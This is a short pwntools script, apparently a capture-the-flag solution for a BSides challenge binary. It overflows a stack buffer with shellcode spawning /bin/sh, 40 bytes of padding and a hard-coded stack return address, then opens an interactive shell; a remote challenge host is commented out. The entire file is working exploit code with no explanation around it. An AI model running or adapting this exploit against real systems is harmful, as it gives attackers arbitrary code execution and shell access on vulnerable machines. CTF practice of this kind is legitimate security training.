from pwn import *

elf = ELF('./chall')
context.binary = elf
p = gdb.debug(elf.path, gdbscript='b *0x401013')
#p = remote(port=443, host='sys-rop.bsides.shellmates.club', ssl=True)
#p = process(elf.path)


p.recv()

stack_ret_addr = p64(0x00007ffcf533a7c0)

shellcode = asm(shellcraft.sh())
payload = shellcode + b'A' * 40
payload += stack_ret_addr

p.sendline(payload)

p.interactive()
